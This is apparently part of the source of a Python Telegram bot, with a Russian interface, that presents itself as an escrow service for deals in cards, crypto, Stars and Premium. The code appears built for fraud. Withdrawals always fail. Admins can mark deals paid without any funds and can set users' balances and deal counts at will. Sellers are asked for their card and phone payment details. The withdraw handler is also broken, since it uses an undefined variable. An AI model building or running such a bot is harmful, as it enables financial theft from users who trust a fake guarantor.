async def change_lang(callback: types.CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    lang = user_data.get(user_id, {}).get('lang', 'ru')
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text=get_text(lang, "english_lang_button"), callback_data="lang_en"),
        InlineKeyboardButton(text=get_text(lang, "russian_lang_button"), callback_data="lang_ru")
    )
    builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
    try:
        await bot.delete_message(callback.message.chat.id, callback.message.message_id)
    except:
        pass
    await bot.send_message(callback.message.chat.id, "<b>🌍 Выберите язык:</b>", reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
    await callback.answer()

@dp.callback_query(F.data.startswith("lang_"))
async def set_lang(callback: types.CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    new_lang = callback.data.split("_")[1]
    user_data[user_id]['lang'] = new_lang
    save_user_data(user_id)
    try:
        await bot.delete_message(callback.message.chat.id, callback.message.message_id)
    except:
        pass
    await bot.send_message(callback.message.chat.id, get_text(new_lang, "lang_set_message"), parse_mode=ParseMode.HTML)
    await callback.answer()

@dp.callback_query(F.data == "wallet")
async def wallet_callback(callback: types.CallbackQuery, state: FSMContext, bot: Bot):
    user_id = callback.from_user.id
    lang = user_data[user_id]['lang']
    wallet = user_data[user_id].get("wallet") or get_text(lang, "not_specified")
    await state.set_state(DealStates.awaiting_wallet)
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
    try:
        await bot.delete_message(callback.message.chat.id, callback.message.message_id)
    except:
        pass
    await bot.send_message(callback.message.chat.id, get_text(lang, "wallet_message", wallet=wallet), reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
    await callback.answer()

@dp.callback_query(F.data == "create_deal")
async def create_deal_role(callback: types.CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    lang = user_data[user_id]['lang']
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text=get_text(lang, "role_buyer_button"), callback_data="role_buyer"),
        InlineKeyboardButton(text=get_text(lang, "role_seller_button"), callback_data="role_seller")
    )
    builder.row(InlineKeyboardButton(text=get_text(lang, "back_button"), callback_data="menu"))
    try:
        await bot.delete_message(callback.message.chat.id, callback.message.message_id)
    except:
        pass
    await bot.send_message(callback.message.chat.id, get_text(lang, "role_choice_message"), reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
    await callback.answer()

@dp.callback_query(F.data.startswith("role_"))
async def choose_currency(callback: types.CallbackQuery, state: FSMContext):
    role = callback.data.split("_")[1]
    await state.update_data(deal_role=role)
    user_id = callback.from_user.id
    lang = user_data[user_id]['lang']
    builder = InlineKeyboardBuilder()
    currencies_list = [
        ("🇷🇺 Банковская карта RUB", "cur_RUB"),
        ("🇺🇸 Банковская карта USD", "cur_USD"),
        ("🇰🇿 KZT", "cur_KZT"), ("🇧🇾 BYN", "cur_BYN"), ("🇺🇦 UAH", "cur_UAH"),
        ("🇺🇿 UZS", "cur_UZS"), ("🇦🇲 AMD", "cur_AMD"), ("🇦🇿 AZN", "cur_AZN"),
        ("🇰🇬 KGS", "cur_KGS"), ("🇹🇯 TJS", "cur_TJS"),
        ("👛 USDT", "cur_USDT"), ("💎 TON", "cur_TON"),
        ("⭐ Telegram Stars", "cur_XTR"), ("🎁 TG Premium", "cur_PREM")
    ]
    for i in range(0, len(currencies_list), 2):
        if i + 1 < len(currencies_list):
            builder.row(
                InlineKeyboardButton(text=currencies_list[i][0], callback_data=currencies_list[i][1]),
                InlineKeyboardButton(text=currencies_list[i+1][0], callback_data=currencies_list[i+1][1])
            )
        else:
            builder.row(InlineKeyboardButton(text=currencies_list[i][0], callback_data=currencies_list[i][1]))
    builder.row(InlineKeyboardButton(text="⬅️ Назад", callback_data="create_deal"))
    await callback.message.edit_text(get_text(lang, "currency_choice_message"), reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
    await callback.answer()

@dp.callback_query(F.data.startswith("cur_"))
async def after_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(deal_currency=currency)
    user_id = callback.from_user.id
    lang = user_data[user_id]['lang']
    if currency in ["XTR", "PREM"]:
        await state.set_state(DealStates.awaiting_target_username)
        msg_key = "awaiting_target_username_xtr" if currency == "XTR" else "awaiting_target_username_prem"
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
        await callback.message.edit_text(get_text(lang, msg_key), reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
        await callback.answer()
        return
    wallet = user_data[user_id].get("wallet")
    if not wallet:
        await state.set_state(DealStates.awaiting_deal_wallet)
        await callback.message.edit_text(
            "<b>💳 У вас не указаны реквизиты!</b>\n\n"
            "<i>Пожалуйста, отправьте данные для получения средств прямо сюда в чат, чтобы мы могли продолжить:</i>\n\n"
            "<blockquote>Пример: номер счета/карты (1234 1234 1234 1234)\n\n"
            "Пример: номер телефона (+79999999999 Озон/ВТБ/Сбер и т.д.)</blockquote>",
            parse_mode=ParseMode.HTML
        )
        await callback.answer()
        return
    await state.set_state(DealStates.awaiting_amount)
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
    await callback.message.edit_text(get_text(lang, "create_deal_message", valute=CURRENCIES.get(currency, currency)), reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
    await callback.answer()

@dp.callback_query(F.data.startswith("prem_"))
async def premium_amount(callback: types.CallbackQuery, state: FSMContext):
    duration = callback.data.split("_")[1]
    await state.update_data(amount=float(duration))
    await state.set_state(DealStates.awaiting_description)
    lang = user_data[callback.from_user.id]['lang']
    await callback.message.edit_text(get_text(lang, "awaiting_description_message"), parse_mode=ParseMode.HTML)
    await callback.answer()

@dp.callback_query(F.data == "profile")
async def profile_callback(callback: types.CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    u = user_data[user_id]
    lang = u['lang']
    balances_list = []
    for cur_code, cur_symbol in CURRENCIES.items():
        balance = u.get(f'balance_{cur_code.lower()}', 0.0)
        if balance > 0:
            balances_list.append(f"• {cur_symbol}: <b>{balance}</b>")
    if not balances_list:
        balances_text = "💰 Баланс пуст" if lang == 'ru' else "💰 Balance is empty"
    else:
        balances_text = "\n".join(balances_list)
    lang_name = "🇷🇺 Русский" if u['lang'] == 'ru' else "🇺🇸 English"
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text=get_text(lang, "deposit_button"), callback_data="deposit"),
        InlineKeyboardButton(text=get_text(lang, "withdraw_button"), callback_data="withdraw")
    )
    builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
    try:
        await bot.delete_message(callback.message.chat.id, callback.message.message_id)
    except:
        pass
    await bot.send_message(
        callback.message.chat.id,
        get_text(lang, "profile_message", user_id=user_id, username=callback.from_user.username or "Unknown",
                 lang_name=lang_name, balances=balances_text, successful_deals=u.get('successful_deals', 0),
                 wallet=u.get('wallet') or get_text(lang, "not_specified")),
        reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML
    )
    await callback.answer()

@dp.callback_query(F.data == "deposit")
async def deposit_menu(callback: types.CallbackQuery):
    lang = user_data[callback.from_user.id]['lang']
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text=get_text(lang, "dep_card_button"), callback_data="dep_card"),
        InlineKeyboardButton(text=get_text(lang, "dep_ton_button"), callback_data="dep_ton")
    )
    builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
    await callback.message.edit_text(get_text(lang, "deposit_choice_message"), reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
    await callback.answer()

@dp.callback_query(F.data == "dep_card")
async def dep_card(callback: types.CallbackQuery):
    lang = user_data[callback.from_user.id]['lang']
    await callback.answer(get_text(lang, "deposit_card_unavailable"), show_alert=True)

@dp.callback_query(F.data == "dep_ton")
async def dep_ton(callback: types.CallbackQuery):
    lang = user_data[callback.from_user.id]['lang']
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
    await callback.message.edit_text(get_text(lang, "deposit_ton_message"), reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
    await callback.answer()

@dp.callback_query(F.data == "withdraw")
async def withdraw(callback: types.CallbackQuery):
    lang = user_data[callback.from_user.id]['lang']
    
    total_balance = 0.0
    for cur_code in CURRENCIES.keys():
        balance = user_data[user_id].get(f'balance_{cur_code.lower()}', 0.0)
        total_balance += balance
    
    if total_balance <= 0:
        await callback.answer(get_text(lang, "withdraw_limit"), show_alert=True)
        return
        
    await callback.answer(get_text(lang, "withdraw_unavailable"), show_alert=True)

@dp.callback_query(F.data == "my_deals")
async def my_deals(callback: types.CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    lang = user_data[user_id]['lang']
    user_deals = [d for d, v in deals.items() if v['seller_id'] == user_id or v['buyer_id'] == user_id]
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
    try:
        await bot.delete_message(callback.message.chat.id, callback.message.message_id)
    except:
        pass
    if not user_deals:
        await bot.send_message(callback.message.chat.id, get_text(lang, "no_active_deals"), reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
    else:
        deals_list = "\n".join([f"ID: <code>{d}</code> | Сумма: <b>{deals[d]['amount']} {deals[d].get('currency', 'TON')}</b>" for d in user_deals])
        await bot.send_message(callback.message.chat.id, get_text(lang, "my_deals_list", deals_list=deals_list), reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
    await callback.answer()

@dp.callback_query(F.data == "about")
async def about(callback: types.CallbackQuery, bot: Bot):
    lang = user_data[callback.from_user.id]['lang']
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
    try:
        await bot.delete_message(callback.message.chat.id, callback.message.message_id)
    except:
        pass
    await bot.send_message(callback.message.chat.id, get_text(lang, "about_message"), reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
    await callback.answer()

@dp.callback_query(F.data == "referral")
async def referral(callback: types.CallbackQuery, bot: Bot):
    global BOT_USERNAME
    user_id = callback.from_user.id
    lang = user_data[user_id]['lang']
    referral_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
    try:
        await bot.delete_message(callback.message.chat.id, callback.message.message_id)
    except:
        pass
    await bot.send_message(
        callback.message.chat.id,
        get_text(lang, "referral_message", referral_link=referral_link, valute=CURRENCIES[VALUTE]),
        reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_list")
async def admin_list(callback: types.CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return
    admins_list = "\n".join([f"• <code>{a_id}</code> | @{user_data.get(a_id, {}).get('username', 'unknown')}" for a_id in ADMIN_IDS])
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="menu"))
    await callback.message.edit_text(
        RU_TEXTS["admin_list_message"].format(admins_list=admins_list),
        reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_maintenance")
async def toggle_maintenance(callback: types.CallbackQuery):
    global MAINTENANCE_MODE
    if callback.from_user.id not in ADMIN_IDS:
        return
    MAINTENANCE_MODE = not MAINTENANCE_MODE
    save_setting("maintenance_mode", MAINTENANCE_MODE)
    await callback.message.edit_reply_markup(reply_markup=get_admin_menu())
    status_text = "включен" if MAINTENANCE_MODE else "выключен"
    await callback.answer(f"🛠 Тех. перерыв {status_text}")

@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return
    users_count = len(user_data)
    deals_count = len(deals)
    total_success = sum(u.get('successful_deals', 0) for u in user_data.values())
    await callback.answer(f"Пользователей: {users_count}\nСделок: {deals_count}\nУспешных: {total_success}", show_alert=True)

@dp.callback_query(F.data == "admin_view_deals")
async def admin_view_deals(callback: types.CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return
    if not deals:
        await callback.message.edit_text("<b>📂 Нет активных сделок.</b>", parse_mode=ParseMode.HTML)
    else:
        deals_list = "\n\n".join([f"ID: <code>{d}</code>\nСумма: <b>{deals[d]['amount']} {deals[d].get('currency', 'TON')}</b>\nПродавец: <code>{deals[d]['seller_id']}</code>\nПокупатель: <code>{deals[d].get('buyer_id', 'Нет')}</code>\nСтатус: <b>{deals[d].get('status', 'pending')}</b>" for d in deals])
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="menu"))
        await callback.message.edit_text(get_text('ru', "admin_view_deals_message", deals_list=deals_list), reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
    await callback.answer()

@dp.callback_query(F.data == "admin_add")
async def admin_add_prompt(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        return
    await state.set_state(DealStates.awaiting_admin_input)
    admin_pending[callback.from_user.id] = "add"
    await callback.message.edit_text("<b>👤 Введите ID пользователя для назначения админом:</b>", parse_mode=ParseMode.HTML)

@dp.callback_query(F.data == "admin_remove")
async def admin_remove_prompt(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        return
    await state.set_state(DealStates.awaiting_admin_input)
    admin_pending[callback.from_user.id] = "remove"
    await callback.message.edit_text("<b>❌ Введите ID пользователя для снятия админ-прав:</b>", parse_mode=ParseMode.HTML)

@dp.callback_query(F.data == "admin_change_balance")
async def admin_change_balance(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        return
    await state.set_state(DealStates.awaiting_admin_input)
    admin_pending[callback.from_user.id] = "change_balance"
    await callback.message.edit_text("<b>💰 Введите:</b> <code>ID TON RUB XTR</code>\n<i>Пример: 123456789 100 5000 200</i>", parse_mode=ParseMode.HTML)

@dp.callback_query(F.data == "admin_change_successful_deals")
async def admin_change_successful(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        return
    await state.set_state(DealStates.awaiting_admin_input)
    admin_pending[callback.from_user.id] = "change_successful"
    await callback.message.edit_text("<b>⭐ Введите ID пользователя и количество успешных сделок:</b>\n<code>user_id количество</code>", parse_mode=ParseMode.HTML)

@dp.callback_query(F.data == "admin_change_valute")
async def admin_change_valute(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        return
    await state.set_state(DealStates.awaiting_admin_input)
    admin_pending[callback.from_user.id] = "change_valute"
    await callback.message.edit_text("<b>💱 Введите новую валюту:</b>\n<i>Например: USD, EUR, RUB</i>", parse_mode=ParseMode.HTML)

@dp.callback_query(F.data.startswith("pay_"))
async def pay_deal(callback: types.CallbackQuery, bot: Bot):
    parts = callback.data.split("_")
    currency = parts[1]
    deal_id = parts[2]
    deal = deals.get(deal_id)
    user_id = callback.from_user.id
    lang = user_data[user_id]['lang']
    if not deal or deal.get('currency', 'TON') != currency:
        await callback.answer(get_text(lang, "deal_not_found"), show_alert=True)
        return
    buyer_balance = user_data[user_id].get(f'balance_{currency.lower()}', 0.0)
    is_admin = user_id in ADMIN_IDS
    if buyer_balance >= float(deal['amount']) or is_admin:
        if not is_admin:
            user_data[user_id][f'balance_{currency.lower()}'] -= deal['amount']
            save_user_data(user_id)
        deals[deal_id]['status'] = 'paid'
        save_deal(deal_id)
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
        await callback.message.edit_text(
            get_text(lang, "payment_confirmed_message", deal_id=deal_id), reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML
        )
        buyer_username = callback.from_user.username or get_text(lang, "unknown_user")
        seller_lang = user_data.get(deal['seller_id'], {}).get('lang', 'ru')
        builder2 = InlineKeyboardBuilder()
        builder2.row(InlineKeyboardButton(text=get_text(seller_lang, "seller_sent_button"), callback_data=f"sent_{deal_id}"))
        await bot.send_message(
            deal['seller_id'],
            get_text(seller_lang, "payment_confirmed_seller_message", deal_id=deal_id, description=deal['description'], buyer_username=buyer_username),
            reply_markup=builder2.as_markup(), parse_mode=ParseMode.HTML
        )
    else:
        await callback.answer(get_text(lang, "insufficient_balance_message"), show_alert=True)

@dp.callback_query(F.data.startswith("sent_"))
async def seller_sent(callback: types.CallbackQuery, bot: Bot):
    deal_id = callback.data.split("_")[1]
    deal = deals.get(deal_id)
    if not deal:
        await callback.answer("Сделка не найдена.", show_alert=True)
        return
    deal['status'] = 'sent'
    save_deal(deal_id)
    buyer_lang = user_data.get(deal['buyer_id'], {}).get('lang', 'ru')
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text=get_text(buyer_lang, "buyer_received_button"), callback_data=f"rcv_{deal_id}"),
        InlineKeyboardButton(text=get_text(buyer_lang, "buyer_not_received_button"), callback_data=f"nrcv_{deal_id}")
    )
    await bot.send_message(
        deal['buyer_id'],
        get_text(buyer_lang, "buyer_confirm_receipt", deal_id=deal_id),
        reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML
    )
    await callback.message.edit_text("<b>⏳ Ожидаем подтверждения от покупателя.</b>", parse_mode=ParseMode.HTML)
    await callback.answer()

@dp.callback_query(F.data.startswith("rcv_"))
async def buyer_received(callback: types.CallbackQuery, bot: Bot):
    action, deal_id = callback.data.split("_", 1)
    deal = deals.get(deal_id)
    if not deal:
        await callback.answer("Сделка не найдена.", show_alert=True)
        return
    lang = user_data[callback.from_user.id]['lang']
    currency = deal['currency'].lower()
    user_data[deal['seller_id']][f'balance_{currency}'] += deal['amount']
    user_data[deal['seller_id']]['successful_deals'] += 1
    save_user_data(deal['seller_id'])
    del deals[deal_id]
    delete_deal(deal_id)
    await callback.message.edit_text(get_text(lang, "deal_closed_success", deal_id=deal_id), parse_mode=ParseMode.HTML)
    seller_lang = user_data.get(deal['seller_id'], {}).get('lang', 'ru')
    await bot.send_message(deal['seller_id'], get_text(seller_lang, "deal_closed_success", deal_id=deal_id), parse_mode=ParseMode.HTML)
    await callback.answer()

@dp.callback_query(F.data.startswith("nrcv_"))
async def buyer_not_received(callback: types.CallbackQuery, bot: Bot):
    action, deal_id = callback.data.split("_", 1)
    deal = deals.get(deal_id)
    if not deal:
        await callback.answer("Сделка не найдена.", show_alert=True)
        return
    deal['status'] = 'disputed'
    save_deal(deal_id)
    lang = user_data[callback.from_user.id]['lang']
    await callback.message.edit_text(get_text(lang, "buyer_not_received"), parse_mode=ParseMode.HTML)
    seller_lang = user_data.get(deal['seller_id'], {}).get('lang', 'ru')
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_text(seller_lang, "seller_sent_button"), callback_data=f"sent_{deal_id}"))
    await bot.send_message(deal['seller_id'], get_text(seller_lang, "seller_not_received_alert", deal_id=deal_id), reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
    await callback.answer()

@dp.message(DealStates.awaiting_wallet)
async def process_wallet(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    lang = user_data[user_id]['lang']
    user_data[user_id]['wallet'] = message.text
    save_user_data(user_id)
    await state.clear()
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
    await message.answer(get_text(lang, "wallet_updated_message", wallet=message.text), reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)

@dp.message(DealStates.awaiting_deal_wallet)
async def process_deal_wallet(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    lang = user_data[user_id]['lang']
    user_data[user_id]['wallet'] = message.text
    save_user_data(user_id)
    data = await state.get_data()
    currency = data.get('deal_currency')
    await state.set_state(DealStates.awaiting_amount)
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
    await message.answer(get_text(lang, "create_deal_message", valute=CURRENCIES.get(currency, currency)), reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)

@dp.message(DealStates.awaiting_amount)
async def process_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.replace(',', '.'))
        await state.update_data(amount=amount)
        await state.set_state(DealStates.awaiting_description)
        lang = user_data[message.from_user.id]['lang']
        await message.answer(get_text(lang, "awaiting_description_message"), parse_mode=ParseMode.HTML)
    except ValueError:
        await message.answer("<b>❌ Неверный формат суммы.</b> Попробуйте еще раз.", parse_mode=ParseMode.HTML)

@dp.message(DealStates.awaiting_description)
async def process_description(message: types.Message, state: FSMContext, bot: Bot):
    global BOT_USERNAME
    user_id = message.from_user.id
    lang = user_data[user_id]['lang']
    data = await state.get_data()
    deal_id = str(uuid.uuid4())[:8]
    currency = data.get('deal_currency', VALUTE)
    role = data.get('deal_role')
    desc = message.text
    if 'target_username' in data:
        desc = f"{message.text}{get_text(lang, 'target_account_desc', target=data['target_username'])}"
    deals[deal_id] = {
        'amount': data['amount'],
        'currency': currency,
        'description': desc,
        'seller_id': user_id if role == 'seller' else None,
        'buyer_id': user_id if role == 'buyer' else None
    }
    save_deal(deal_id)
    await state.clear()
    link = f"https://t.me/{BOT_USERNAME}?start={deal_id}"
    share_text = quote("Переходи в бота и оплачивай сделку!")
    share_url = f"https://t.me/share/url?url={link}&text={share_text}"
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_text(lang, "share_deal_button"), url=share_url))
    await message.answer(
        get_text(lang, "deal_created_message", amount=deals[deal_id]['amount'], valute=CURRENCIES[currency], description=desc, deal_link=link),
        reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML
    )
    for admin in ADMIN_IDS:
        try:
            await bot.send_message(
                admin,
                f"<b>✨ Новая сделка!</b>\n🆔 ID: <code>{deal_id}</code>\n💰 Сумма: <b>{deals[deal_id]['amount']} {CURRENCIES[currency]}</b>\n👤 Создатель: @{message.from_user.username or user_id}\n📝 Описание: <i>{desc}</i>",
                parse_mode=ParseMode.HTML
            )
        except:
            pass

@dp.message(DealStates.awaiting_target_username)
async def process_target(message: types.Message, state: FSMContext):
    await state.update_data(target_username=message.text.strip())
    lang = user_data[message.from_user.id]['lang']
    data = await state.get_data()
    currency = data.get('deal_currency')
    if currency == "PREM":
        builder = InlineKeyboardBuilder()
        for dur in [("1 месяц", "prem_1"), ("3 месяца", "prem_3"), ("6 месяцев", "prem_6"), ("1 год", "prem_12")]:
            builder.row(InlineKeyboardButton(text=dur[0], callback_data=dur[1]))
        await message.answer(get_text(lang, "premium_duration_choice"), reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
    else:
        await state.set_state(DealStates.awaiting_amount)
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
        await message.answer(get_text(lang, "create_deal_message", valute=CURRENCIES.get(currency, currency)), reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)

@dp.message(DealStates.awaiting_admin_input)
async def process_admin_input(message: types.Message, state: FSMContext):
    global VALUTE
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        return
    action = admin_pending.pop(user_id, None)
    await state.clear()
    try:
        if action == "add":
            new_id = int(message.text.strip())
            ADMIN_IDS.add(new_id)
            save_admin_db(new_id, True)
            await message.answer(f"<b>✅ Пользователь {new_id} теперь админ.</b>", parse_mode=ParseMode.HTML)
        elif action == "remove":
            rem_id = int(message.text.strip())
            if rem_id == 8423178801:
                await message.answer("<b>❌ Главного админа удалить нельзя!</b>", parse_mode=ParseMode.HTML)
            else:
                ADMIN_IDS.discard(rem_id)
                save_admin_db(rem_id, False)
                await message.answer(f"<b>❌ Пользователь {rem_id} больше не админ.</b>", parse_mode=ParseMode.HTML)
        elif action == "change_balance":
            parts = message.text.split()
            target_id = int(parts[0])
            ton = float(parts[1]) if len(parts) > 1 else 0
            rub = float(parts[2]) if len(parts) > 2 else 0
            xtr = float(parts[3]) if len(parts) > 3 else 0
            ensure_user_exists(target_id)
            user_data[target_id]['balance_ton'] = ton
            user_data[target_id]['balance_rub'] = rub
            user_data[target_id]['balance_xtr'] = xtr
            save_user_data(target_id)
            await message.answer(f"<b>💰 Баланс пользователя {target_id} изменён.</b>", parse_mode=ParseMode.HTML)
        elif action == "change_successful":
            parts = message.text.split()
            target_id = int(parts[0])
            count = int(parts[1])
            ensure_user_exists(target_id)
            user_data[target_id]['successful_deals'] = count
            save_user_data(target_id)
            await message.answer(f"<b>⭐ Успешные сделки пользователя {target_id} обновлены на {count}.</b>", parse_mode=ParseMode.HTML)
        elif action == "change_valute":
            new_v = message.text.strip().upper()
            if new_v in CURRENCIES:
                VALUTE = new_v
                await message.answer(f"<b>💱 Валюта изменена на {CURRENCIES[VALUTE]}.</b>", parse_mode=ParseMode.HTML)
            else:
                await message.answer("<b>❌ Доступные:</b> TON, RUB, XTR ...", parse_mode=ParseMode.HTML)
    except Exception as e:
        await message.answer(f"<b>❌ Ошибка:</b> {e}", parse_mode=ParseMode.HTML)

@dp.message(F.text, ~F.text.startswith("/"))
async def handle_message_fallback(message: types.Message, state: FSMContext):
    await state.clear()
    await cmd_start(message, state, message.bot, CommandObject(args=""))

async def main():
    init_db()
    load_data()
    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
